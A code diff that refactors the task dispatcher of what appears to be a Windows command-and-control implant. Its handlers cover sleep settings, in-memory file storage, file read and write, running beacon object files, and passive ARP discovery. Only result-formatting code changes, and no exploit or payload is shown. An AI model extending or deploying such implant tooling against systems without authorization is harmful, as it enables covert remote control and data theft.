@@ -111,9 +111,9 @@ nlohmann::json command_tree(nlohmann::json task_data) {
     //basic checks for the task. 
     if (task_name.empty()) {
         nlohmann::json result;
-        add_int_result(result, "windows_error_code", ERROR_INVALID_PARAMETER);
-        add_text_result(result, "message", GetErrorMessage(ERROR_INVALID_PARAMETER));
-        add_text_result(result, "data", "");
+        result["data"] = "";
+        result["windows_error_code"] = ERROR_INVALID_PARAMETER;
+        result["message"] = GetErrorMessage(ERROR_INVALID_PARAMETER);
         return result;
     }
     /*
@@ -127,10 +127,9 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         
         SettingsManager::instance().set("comms_get_function", comms_get_function);
 
-        add_text_result(result, "data", comms_get_function);
-        //hardcode success, as this is not a module
-        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
-        add_int_result(result, "windows_error_code", ERROR_SUCCESS);
+        result["data"] = comms_get_function;
+        result["windows_error_code"] = ERROR_SUCCESS;
+        result["message"] = GetErrorMessage(ERROR_SUCCESS);
 
         return result;
     }
@@ -142,10 +141,9 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         
         SettingsManager::instance().set("comms_post_function", comms_post_function);
 
-        add_text_result(result, "data", comms_post_function);
-        //hardcode success, as this is not a module
-        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
-        add_int_result(result, "windows_error_code", ERROR_SUCCESS);
+        result["data"] = comms_post_function;
+        result["windows_error_code"] = ERROR_SUCCESS;
+        result["message"] = GetErrorMessage(ERROR_SUCCESS);
 
         return result;
     }
@@ -168,10 +166,9 @@ nlohmann::json command_tree(nlohmann::json task_data) {
             output += name + "\n";
         }
 
-        add_text_result(result, "data", output);
-        //hardcode data response, these do not have the saem req's as modules, as they aren't modules. 
-        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
-        add_int_result(result, "windows_error_code", ERROR_SUCCESS);
+        result["data"] = output;
+        result["windows_error_code"] = ERROR_SUCCESS;
+        result["message"] = GetErrorMessage(ERROR_SUCCESS);
 
         return result;
     }
@@ -182,13 +179,20 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         std::string post_strategy = SettingsManager::instance().get<std::string>("comms_post_function", "");
 
         //hardcode data response, these do not have the saem req's as modules, as they aren't modules. 
-        //note - this may move to a settings option later. 
-        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
-        add_int_result(result, "windows_error_code", ERROR_SUCCESS);
-        add_text_result(result, "data", "");
+        ////note - this may move to a settings option later. 
+        //add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
+        //add_int_result(result, "windows_error_code", ERROR_SUCCESS);
+        //add_text_result(result, "data", "");
 
-        add_text_result(result, "comms_get_strategy", get_strategy);
-        add_text_result(result, "comms_post_strategy", post_strategy);
+        //add_text_result(result, "comms_get_strategy", get_strategy);
+        //add_text_result(result, "comms_post_strategy", post_strategy);
+
+        result["data"] = "";
+        result["windows_error_code"] = ERROR_SUCCESS;
+        result["message"] = GetErrorMessage(ERROR_SUCCESS);
+
+        result["comms_get_strategy"] = get_strategy;
+        result["comms_post_strategy"] = post_strategy;
 
         return result;
     }
@@ -210,9 +214,9 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         SettingsManager::instance().set("sleep_time", sleep_time);
 
         //add_text_result(result, "message", "Sleep set to: " + std::to_string(sleep_time));
-        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
-        add_text_result(result, "data", std::to_string(sleep_time));
-        add_int_result(result, "windows_error_code", ERROR_SUCCESS);
+        result["data"] = "";
+        result["windows_error_code"] = ERROR_SUCCESS;
+        result["message"] = GetErrorMessage(ERROR_SUCCESS);
 
         return result;
     }
@@ -222,11 +226,11 @@ nlohmann::json command_tree(nlohmann::json task_data) {
 
         auto& args = task_data["task"]["args"];
         if (!args.contains("file_contents") || !args["file_contents"].is_binary()) {
-            add_text_result(result, "error", "Task failed: 'file_contents' is missing or not binary.");
+            result["error"] = "Task failed: 'file_contents' is missing or not binary.";
             return result;
         }
         if (!args.contains("file_name") || !args["file_name"].is_string()) {
-            add_text_result(result, "error", "Task failed: 'file_name' is missing or not a string.");
+            result["error"] = "Task failed: 'file_name' is missing or not a string.";
             return result;
         }
 
@@ -242,10 +246,9 @@ nlohmann::json command_tree(nlohmann::json task_data) {
 
         //store does not have a return type/good way to check success yet, for now, assuming it was successful
         //could do a "num of items before, then add, and if items = items +1"
-        add_text_result(result, "message", GetErrorMessage(windows_error_code));
-        add_int_result(result, "windows_error_code", windows_error_code);
-        //hardcode data response, memstore does not have same returns as modules,  as it's not a module
-        add_text_result(result, "data", "");
+        result["data"] = "";
+        result["windows_error_code"] = windows_error_code;
+        result["message"] = GetErrorMessage(windows_error_code);
         return result;
 
 
@@ -255,7 +258,7 @@ nlohmann::json command_tree(nlohmann::json task_data) {
 
         auto& args = task_data["task"]["args"];
         if (!args.contains("file_name") || !args["file_name"].is_string()) {
-            add_text_result(result, "error", "Task failed: 'file_name' is missing or not string.");
+            result["error"] = "file_name is missing";
             return result;
         }
 
@@ -263,10 +266,10 @@ nlohmann::json command_tree(nlohmann::json task_data) {
 
         std::vector<uint8_t> memstore_file_bytes = MemStore::instance().get(memstore_file_to_download);
 
-        add_bytes_result(result, "data", memstore_file_bytes);
-        //hardcode response, memstore does not have same return values as modules, as it's not a module
-        add_int_result(result, "windows_error_code", ERROR_SUCCESS);
-        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
+        //add_bytes_result(result, "data", memstore_file_bytes);
+        result["data"] = "";
+        result["windows_error_code"] = ERROR_SUCCESS;
+        result["message"] = GetErrorMessage(ERROR_SUCCESS);
         return result;
     }
     else if (task_name == "memstore delete") {
@@ -275,17 +278,16 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         //check for correct values
         auto& args = task_data["task"]["args"];
         if (!args.contains("file_name") || !args["file_name"].is_string()) {
-            add_text_result(result, "error", "Task failed: 'file_name' is missing or not string.");
+            result["error"] = "Task failed: 'file_name' is missing or not string.";
             return result;
         }
 
         std::string memstore_file_to_remove = task_data["task"]["args"]["file_name"];
 
         int windows_error_code = MemStore::instance().remove(memstore_file_to_remove);
-        add_text_result(result, "message", GetErrorMessage(windows_error_code));
-        add_int_result(result, "windows_error_code", windows_error_code);
-        //hardcode data field, memstore does not have same requirements as modules,  as it's not a module
-        add_text_result(result, "data", "");
+        result["data"] = "";
+        result["windows_error_code"] = windows_error_code;
+        result["message"] = GetErrorMessage(windows_error_code);
         return result;
 
 
@@ -296,10 +298,9 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         //currently always returns success
         int windows_error_code = MemStore::instance().clear();
 
-        add_text_result(result, "message", GetErrorMessage(windows_error_code));
-        add_int_result(result, "windows_error_code", windows_error_code);
-        //hardcode data response, memstore does not have same response req's as modules,  as it's not a module
-        add_text_result(result, "data", "");
+        result["data"] = "";
+        result["windows_error_code"] = windows_error_code;
+        result["message"] = GetErrorMessage(windows_error_code);
         return result;
 
     }
@@ -316,10 +317,12 @@ nlohmann::json command_tree(nlohmann::json task_data) {
 
         //std::cout << output << std::endl;
 
-        add_text_result(result, "data", output);
+        //add_text_result(result, "data", output);
         //hardcode response, memstore does not have same return values as modules,  as it's not a module
-        add_int_result(result, "windows_error_code", ERROR_SUCCESS);
-        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
+
+        result["windows_error_code"] = ERROR_SUCCESS;
+        result["message"] = GetErrorMessage(ERROR_SUCCESS);
+        result["data"] = output;
 
         return result;
     }
@@ -339,13 +342,14 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         }
 
         ModuleResult module_result = ls(directory_to_list);
-        std::string files_list = module_result.data;
+        //std::string files_list = module_result.data;
         DWORD windows_error_code = module_result.windows_error_code;
 
-        add_text_result(result, "message", GetErrorMessage(windows_error_code));
-        add_int_result(result, "windows_error_code", windows_error_code);
-        add_text_result(result, "data", files_list);
-        
+
+        result["windows_error_code"] = windows_error_code;
+        result["message"] = GetErrorMessage(windows_error_code);
+        result["data"] = module_result.data;
+
 
         return result;
     }
@@ -364,10 +368,9 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         std::string data = module_result.data;
         DWORD windows_error_code = module_result.windows_error_code;
 
-        add_text_result(result, "data", data);
-        add_text_result(result, "message", GetErrorMessage(windows_error_code));
-        add_int_result(result, "windows_error_code", windows_error_code);
-
+        result["windows_error_code"] = windows_error_code;
+        result["message"] = GetErrorMessage(windows_error_code);
+        result["data"] = module_result.data;
         return result;
 
     }
@@ -377,7 +380,7 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         //check for correct values
         auto& args = task_data["task"]["args"];
         if (!args.contains("file_path") || !args["file_path"].is_string()) {
-            add_text_result(result, "error", "Task failed: 'file_path' is missing or not a string.");
+            result["error"] = "Task failed: 'file_path' is missing or not a string.";
             return result;
         }
 
@@ -390,15 +393,15 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         DWORD windows_error_code = module_result.windows_error_code;
 
         if (file_contents.empty()) {
-            add_text_result(result, "message", "File appears to be empty");
-            add_int_result(result, "windows_error_code", static_cast<int>(windows_error_code)); //dword -> int
+            result["windows_error_code"] = windows_error_code;
+            result["message"] = "The file appears to be empty";
             return result;
 
         }
 
-        add_text_result(result, "message", GetErrorMessage(windows_error_code));
-        add_int_result(result, "windows_error_code", windows_error_code);
-        add_bytes_result(result, "data", file_contents);
+        result["windows_error_code"] = windows_error_code;
+        result["message"] = GetErrorMessage(windows_error_code);
+        result["data"] = module_result.data;
 
         return result;
     }
@@ -419,7 +422,7 @@ nlohmann::json command_tree(nlohmann::json task_data) {
 
         // sanity check to make sure that the vector is not empty.
         if (file_bytes.empty()) {
-            add_text_result(result, "error", "File content was empty (or invalid pointer). Wrote 0 bytes.");
+            result["error"] = "File content was empty(or invalid pointer).Wrote 0 bytes.";
             return result;
         }
 
@@ -427,9 +430,10 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         std::string data = module_result.data;
         DWORD windows_error_code = module_result.windows_error_code;
 
-        add_text_result(result, "message", GetErrorMessage(windows_error_code));
-        add_int_result(result, "windows_error_code", windows_error_code);
-        add_text_result(result, "data", data);
+        result["windows_error_code"] = windows_error_code;
+        result["message"] = GetErrorMessage(windows_error_code);
+        result["data"] = module_result.data;
+
 
         return result;
     }
@@ -442,7 +446,8 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         // Validate Inputs
         if (!args.contains("bof_contents") || !args.contains("bof_args")) {
             //throw std::runtime_error("Missing required arguments: bof_contents, bof_args");
-            add_text_result(result, "error", "Missing bof_contents or bof_args");
+            result["error"] = "Missing bof_contents or bof_args";
+
             return result;
         }
 
@@ -452,7 +457,8 @@ nlohmann::json command_tree(nlohmann::json task_data) {
 
         // sanity check to make sure that the vector is not empty.
         if (bof_bytes.empty()) {
-            add_text_result(result, "error", "bof content was empty (or invalid pointer).");
+            result["error"] = "bof content was empty (or invalid pointer)";
+
             return result;
         }
 
@@ -460,9 +466,10 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         std::string data = module_result.data;
         DWORD windows_error_code = module_result.windows_error_code;
 
-        add_text_result(result, "message", GetErrorMessage(windows_error_code));
-        add_int_result(result, "windows_error_code", windows_error_code);
-        add_text_result(result, "data", data);
+        result["windows_error_code"] = windows_error_code;
+        result["message"] = GetErrorMessage(windows_error_code);
+        result["data"] = module_result.data;
+
 
         return result;
     }
@@ -470,19 +477,19 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         nlohmann::json result;
 
         ModuleResult module_result = passive_arp_discovery();
-        std::string data = module_result.data;
         DWORD windows_error_code = module_result.windows_error_code;
 
-        add_text_result(result, "message", GetErrorMessage(windows_error_code));
-        add_int_result(result, "windows_error_code", windows_error_code);
-        add_text_result(result, "data", data);
+        result["data"] = module_result.data;
+        result["windows_error_code"] = windows_error_code;
+        result["message"] = GetErrorMessage(windows_error_code);
+
         return result;
     }
     else {
         nlohmann::json result;
-        add_int_result(result, "windows_error_code", ERROR_INVALID_PARAMETER);
-        add_text_result(result, "message", GetErrorMessage(ERROR_INVALID_PARAMETER));
-        add_text_result(result, "data", "");
+        result["data"] = "";
+        result["windows_error_code"] = ERROR_INVALID_PARAMETER;
+        result["message"] = GetErrorMessage(ERROR_INVALID_PARAMETER);
 
         return result;
     }
